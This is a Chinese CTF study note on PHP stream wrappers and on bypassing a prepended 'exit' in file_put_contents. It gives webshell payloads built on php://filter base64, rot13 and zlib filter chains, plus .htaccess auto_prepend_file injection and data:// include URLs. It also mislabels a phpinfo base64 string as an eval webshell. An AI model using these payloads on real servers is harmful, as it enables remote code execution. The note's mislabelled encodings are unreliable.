php支持的伪协议
```
1 file:// — 访问本地文件系统
2 http:// — 访问 HTTP(s) 网址
3 ftp:// — 访问 FTP(s) URLs
4 php:// — 访问各个输入/输出流（I/O streams）
5 zlib:// — 压缩流
6 data:// — 数据（RFC 2397）
7 glob:// — 查找匹配的文件路径模式
8 phar:// — PHP 归档
9 ssh2:// — Secure Shell 2
10 rar:// — RAR
11 ogg:// — 音频流
12 expect:// — 处理交互式的流

```
#  PHP伪协议及死亡绕过


## 定义[#](https://www.cnblogs.com/a5trid/p/18826001#%E5%AE%9A%E4%B9%89)

PHP伪协议（PHP Wrappers）是一种PHP提供的特殊协议或方案，允许程序通过不同的“协议”或“方案”来访问不同类型的数据资源。这些伪协议通常在文件操作或流处理时使用，可以用于访问远程文件、数据或本地文件，甚至是某些PHP函数内部的特定处理。PHP伪协议可以让你通过特定的URL结构或数据流方式与文件进行交互。

简单理解就是通过不同的前缀来让php执行不同方式的代码

## 常见php伪协议类型[#](https://www.cnblogs.com/a5trid/p/18826001#%E5%B8%B8%E8%A7%81php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%B1%BB%E5%9E%8B)

> file:// — 通过URL访问本地文件系统
> 
> http:// — 访问 HTTP(s) 网址，读取远程网站的数据
> 
> https:// — 访问 HTTP(s) 网址，读取远程网站的数据
> 
> ftp:// — 访问 FTP(s) URLs ，通过FTP协议与远程服务器进行交互，读取或者上传文件
> 
> php:// — 访问各个输入/输出流（I/O streams）
> 
> zip:// — 压缩流 ，用于处理zip文件中的文件，支持读取解压修改文件
> 
> data:// — 数据（RFC 2397），允许数据以URL的编码的方式嵌入到请求中。它可以在不涉及文件系统的情况下处理数据
> 
> glob:// — 查找匹配的文件路径模式
> 
> phar:// — PHP 归档 ，将多个PHP文件打包成一个文件的格式，类似于 tar，zip，可以用来访问php归档文件中的文件和资源
> 
> ssh2:// — Secure Shell 2
> 
> rar:// — RAR
> 
> ogg:// — 音频流
> 
> expect:// — 处理交互式的流

## 详细解读[#](https://www.cnblogs.com/a5trid/p/18826001#%E8%AF%A6%E7%BB%86%E8%A7%A3%E8%AF%BB)

### file://协议

1. file://协议的基本格式
    
    ```php
    file://[hostname]/path/to/file
    ```
    
    > - file://是协议头，表示file协议
    > - [hostname]表示要访问的主机，通常为空（省略）或者localhost表示本地的文件系统。但是如果需要访问远程主机的文件系统，则需要指定主机名
    > - /path/to/file表示文件的绝对路径或者相对路径
    
2. 工作原理：
    
    主要通过访问文件系统中的资源。并不会通过网络协议，它是直接与操作系统来进行交互进而进行文件的读取或者文件的查询
    
3. 举例：
    
    访问本地文件：`file:///C:/Users/21690/a5trid.txt（`这里注意是正斜杠）
    
4. 实际比赛中：
    
    > - 文件包含漏洞：file://协议可以直接访问服务器的文件系统，当下恒旭没有进行严格过滤的时候，既可以利用这个协议访问文件
    > - 目录穿越漏洞：当可以输入类似 `../../` 的路径，就结合 `file://` 协议，就可以进行一些文件的读取
    > - 与其他协议相结合，从而扩大攻击，如`file://php://filter/read=convert.base64-encode/resource=flag`，这条指令会使用php的过滤器功能，将flag文件内容以base64编码形式读取
    
5. 防范：
    
    - 可以对用户输入进行严格验证，让其只被允许访问合法的文件
    - 禁止使用危险函数（ 例如PHP 中的 `file_get_contents` 或 `include`）
    - 设置基目录限制（如 PHP 的 `open_basedir` 配置）。
6. 备注：由于是在本地读取文件，所以不受allow_url_fopen与allow_url_include的影响，可以在双off的情况下正常使用
    

### php://伪协议[#](https://www.cnblogs.com/a5trid/p/18826001#php%E4%BC%AA%E5%8D%8F%E8%AE%AE)

#### 输入流[#](https://www.cnblogs.com/a5trid/p/18826001#%E8%BE%93%E5%85%A5%E6%B5%81)

##### php://input

1. 是 PHP 中的一个输入流，属于 `php://` 伪协议的一部分。它用于直接获取 HTTP 请求体的原始数据，但是不会受到 PHP 的自动解析处理（例如表单数据解析）。这是处理复杂或非标准请求数据的一种强大工具，特别是在接受 JSON、XML 或其他自定义格式的数据时。
    
2. 特点：
    
    > - 原始数据访问：
    >     
    >     允许开发者直接获取未经解析的原始HTTP请求体
    >     
    >     数据不会经过PHP的psot和get的自动处理
    >     
    > - 只读流：
    >     
    >     只能用来读取数据，不能用来进行写操作
    >     
    >     数据只能读一次
    >     
    > - 支持的请求方法：
    >     
    >     主要用于post，put，patch和其他带有请求体的http方法
    >     
    >     对于get和其他无请求体的方法，会返回空字符
    >     
    
3. 当传进去的参数作为文件名变量去打开文件时，可以将参数file传参为php://input，同时post方式传进去值作为文件内容，供php代码执行时当做文件内容读取。
    
    [![image-20250111165731515](https://astrid.oss-cn-chengdu.aliyuncs.com/Polar1/20250111190510369.png)](https://astrid.oss-cn-chengdu.aliyuncs.com/Polar1/20250111190510369.png)
    

##### php://stdin

1. 允许 PHP 从标准输入流读取数据，类似于 Unix 系统中的输入流。标准输入通常指的是用户在控制台中键入的内容。在命令行模式下，使用 `php://stdin` 可以读取用户的输入。在 Web 环境中，，但它仍然可以通过一些特殊手段绕过常规的输入方式。
2. 工作原理：`php://stdin` 作为流式协议，允许 PHP 直接读取命令行或脚本的输入。它类似于 `php://input`，但 `php://input` 用于读取 HTTP 请求体，而 `php://stdin` 读取的是标准输入流中的数据。

#### 输出流[#](https://www.cnblogs.com/a5trid/p/18826001#%E8%BE%93%E5%87%BA%E6%B5%81)

##### php://output

1. 是一个流协议，它允许开发者直接向HTTP响应包输出内容，主要作用是输出数据到浏览器客户端
2. 与echo的不同，可以通过流的方式控制输出，而不需要立即将内容打印到浏览器

##### php://stderr

1. 是 PHP 中的一个流协议，用于向标准错误流 (stderr) 输出数据。它是与 `php://stdout`（标准输出流）类似的流，只不过 `stderr` 是专门用于输出错误信息的流。通过这个协议，可以通过向控制台或日志系统输出错误信息，而不是将错误信息直接显示在web上
2. 与`php://stdout`（标准输出流）相比较，它主要用于日志记录和错误处理，可以提高错误处理的效率。

#### 过滤器流[#](https://www.cnblogs.com/a5trid/p/18826001#%E8%BF%87%E6%BB%A4%E5%99%A8%E6%B5%81)

##### php://filter

1. `php://filter` 是 PHP 提供的一个特殊流协议，通过这个协议，可以对文件内容进行过滤，转换或者解码操作，并且不用对文件本身进行直接修改。
    
2. 过滤器是PHP中用于处理流内容的机制，php中提供了很多内置的过滤器，可以对中流的数据进行各种处理，比如加密解密，编码解码等。`php://filter` 允许通过指定不同的过滤器链对文件内容进行处理。
    
3. > 常见的php过滤器有
    > 
    > 1. 字符串过滤器(String Filters)
    >     
    >     - string.rot13
    >         
    >         string.rot13对字符串进行ROT13编码或者解码，ROT13是一种简单的加密方法，通过将字母表中的字母轮换十三个位置进行加密数据，（字母表有二十六个字母，进行两次ROT13编码的内容会恢复原样）
    >         
    >         举例`php://filter/read=string.rot13/resource=flag.php`(**注**：这里read=可以不写，不写默认是只读，写的话就说明只能是可读方式)
    >         
    >         php://filter是php的流过滤器协议
    >         
    >         read=string.rot13表示对文件内容进行ROT13编码
    >         
    >         resource=flag是要读取的文件
    >         
    >     - string.toupper
    >         
    >         string.toupper将文件内容转换为大写
    >         
    >         举例`php://filter/read=string.toupper/resource=flag.php`
    >         
    >     - string.tolower
    >         
    >         string.tolower将文件内容转换为小写，不会影响非字母字符
    >         
    >         举例`php//filter/read=string.tolower/resource=flag.php`
    >         
    >     - string.strip_tags
    >         
    >         string.strip_tags主要作用是去除字符中的html和php标签，常常用于从用户输入或网页内容中去除潜在的恶意代码，以增强安全性，尤其是在处理不可信的用户输入时（通常用于防止xss）
    >         
    >         举例`php://filter/read=string.strip_tags/resource=flag`
    >         
    > 2. 转换过滤器(Conversion Filters)
    >     
    >     - convert.base64-encode
    >         
    >         convert.base64-encode将文件内容进行base64编码
    >         
    >         举例`php://filter/convert.base64-encode/resource=flag.php`
    >         
    >     - convert.base64-decode
    >         
    >         convert.base64-encode将文件内容进行base64解码
    >         
    >         举例`php://filter/convert.base64-decode/resource=flag.php`、
    >           ↓写流
    >         `php://filter/write=convert.base64-decode/resource=test.php`
    >           ↓读流
    >           `php://filter/read=convert.base64-decode/resource=test.php`
    >           (这里的read=可以省略所以像第一种一样，第一种本质是一种读流)
    >     - convert.quoted-printable-encode
    >         
    >         convert.quoted-printable-encode就在文件内容末尾加了个=0A
    >         
    >         举例`php://filter/convert.quoted-printable-encode/resource=flag.php`
    >         
    >     - convert.quoted-printable-decode
    >         
    >         convert.quoted-printable-decode就在文件内容末尾将之前加密的=0A去掉
    >         
    >         举例`php://filter/convert.quoted-printable-decode/resource=flag.php`
    >         
    > 3. 压缩过滤器
    >     
    >     - zlib.deflate
    >         
    >         zlib.deflate过滤器将流数据（例如文件、网络请求体等）使用 Deflate 算法进行压缩。
    >         
    >         举例`php://filter/zlib.deflate/resource=flag.php`
    >         
    >     - zlib.inflate
    >         
    >         zlib.inflate将输入数据流中的压缩内容解压，恢复成原始数据。
    >         
    >         举例`php://filter/zlib.deflate|zlib.inflate/resource=flag.php`（压缩之后再解压）
    >         
    > 4. 加密过滤器
    >     
    

#### 内存和临时文件[#](https://www.cnblogs.com/a5trid/p/18826001#%E5%86%85%E5%AD%98%E5%92%8C%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6)

##### php://memory

1. php://memory 是 PHP 中的一种流过滤器，它允许你操作一个内存中的虚拟文件,并且的数据直接存储在内存中，而不是临时文件。
2. 特点：性能高效（内存操作远快于磁盘操作，因为数据存储在内存中），数据具有临时性（内存流的数据会在脚本执行完后丢失，因为他实在存储在内存中并没有持久化到磁盘）

##### php://temp

1. php://temp是php中内置的流协议，表示一个临时文件流。数据会先保存在内存中，直到超出内存限制（通常为 2 MB）后会自动切换到磁盘。
2. 特点：内存加磁盘存储（最开始在内存中，超出内存限制的时候切换到磁盘）临时性（可以用于临时存储文件数据，脚本结束后数据丢失）高效性（数据较小的时候，因为是内存存储，所以访问速度很快，数据较大的时候转移到磁盘上，避免内存溢出的风险）

#### 伪文件流[#](https://www.cnblogs.com/a5trid/p/18826001#%E4%BC%AA%E6%96%87%E4%BB%B6%E6%B5%81)

##### php://fd

1. PHP 的一种特殊流协议，它用于直接与操作系统中的文件描述符交互。文件描述符在操作系统中表示一个打开的文件、套接字、设备或者其他资源的标识符。
2. 文件描述符在操作系统中可以标识为打开文件或者设备的整数值。当程序打开一个文件的时候，操作系统会给他分配一个文件描述符，从而够程序后续的读写操作。

## 关于exit死亡绕过[#](https://www.cnblogs.com/a5trid/p/18826001#%E5%85%B3%E4%BA%8Eexit%E6%AD%BB%E4%BA%A1%E7%BB%95%E8%BF%87)

对于file_put_content()函数，主要有三种形式

原理：将死亡部分的代码解析成php无法识别的代码

### 第一种：[#](https://www.cnblogs.com/a5trid/p/18826001#%E7%AC%AC%E4%B8%80%E7%A7%8D)

```php
file_put_contents($filename , "<?php exit();".$content);
```

filename控制文件名，content则控制文件内容

#### 方法一：[#](https://www.cnblogs.com/a5trid/p/18826001#%E6%96%B9%E6%B3%95%E4%B8%80)

base64编码

当使用php://filter伪协议，会按照设置的解码方式将content进行解码之后再写入协议内

举例：

```php
filename=php://filter/convert.base64-decode/resource=a.php
content=aPD9waHAgcGhwaW5mbygpOz8+ 
//这个是<?=@eval($_POST[a]);?>的base64编码之后
```

补充：

`<?=@eval($_POST[a]);?>`的base64编码其实是PD9waHAgcGhwaW5mbygpOz8+，这里在前面补充一个a，是因为base64解码不会将那些特殊字符解码，只能读phpexit这七个字节，但是base64解码是将四个字节转换成三个字节，所以为了能成功解码，需要随便加以为base64的可打印字符，不一定是a，但是需要可打印

#### 方法二：[#](https://www.cnblogs.com/a5trid/p/18826001#%E6%96%B9%E6%B3%95%E4%BA%8C)

ROT13编码

当使用php://filter伪协议，会按照设置的解码方式将content进行解码之后再写入协议内

举例：

```php
filename=php://filter/string.rot13/resource=a.php
content=<?=@riny($_CBFG[n]);?>
//这个是<?=@eval($_POST[a]);?>的rot13编码
```

补充：

ROT13加密是一种常见的加密方式，是凯撒加密的变种，主要用于字母字符的加密，它会将每个字母替换为它在字母表中前进或后退13个位置的字符来实现加密。

它是一种堆成的加密方法，当对同一段文本进行两次加密的时候，会还原成原始文本。因为字母表有26个字母，所以经过两次旋转会还原。

#### 方法三：[#](https://www.cnblogs.com/a5trid/p/18826001#%E6%96%B9%E6%B3%95%E4%B8%89)

.htaccess的预包含利用

`string.strip_tags`主要作用是去除字符中的html和php标签，尝试返回给定的字符串str去除掉空字符和html和php标记后的结果

可以利用这个 `string.strip_tags`过滤器去除.htaccess内容中的html和php标签，从而消除死亡函数

content闭合死亡代码使其完全消除

```php
filename=php://filter/write=string.strip_tags/resource=.htaccess
content=?>php_value auto_prepend_file E:\\web\\flagg
```

注意：路径需要两个反斜杠`\\`

这种方法需要知道文件的位置和文件名称（一般都在当前目录或者根目录下）

string.strip_tags只能在php5中使用，其他高版本的php中可能发生错误

#### 方法四：[#](https://www.cnblogs.com/a5trid/p/18826001#%E6%96%B9%E6%B3%95%E5%9B%9B)

过滤器组合法

```php
filename=php://filter/string.strip_tags|convert.base64-decode/resource=flag.php
content=?>PD9waHAgcGhwaW5mbygpOz8+
```
可见，`<?php exit; ?>`被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。

万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。

通过过滤器嵌套进行过滤，从而达到代码的更迭


缺点：在php7.3.0以上的版本中会报错，但是低版本则不受影响

解决方法：在高版本的php中（php7），可以使用三个过滤器，先进行压缩，然后再去转小写，然后再解压，这样可以是部分死亡代码失效

```php
filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=a.php
content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?=@eval($_POST[a]);?>/resource=a.php
```

让死亡代码不能正常被读取，然后传入木马
# data://
数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。

示例用法：

```
1、data://text/plain,
http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
 
2、data://text/plain;base64,
http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b

```
范例
Example #1 打印 data:// 的内容

```
<?php
// 打印 "I love PHP"
echo  file_get_contents ( 'data://text/plain;base64,SSBsb3ZlIFBIUAo=' );
?>

```

Example #2 获取媒体类型

```

<?php
$fp    =  fopen ( 'data://text/plain;base64,' ,  'r' );
$meta  =  stream_get_meta_data ( $fp );

// 打印 "text/plain"
echo  $meta [ 'mediatype' ];
?>

```
# zip://

zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。
```
zip://中只能传入绝对路径。
要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）
只需要是zip的压缩包即可，后缀名可以任意更改。
相同的类型的还有zlib://和bzip2://

```
![[Pasted image 20251007134012.png]]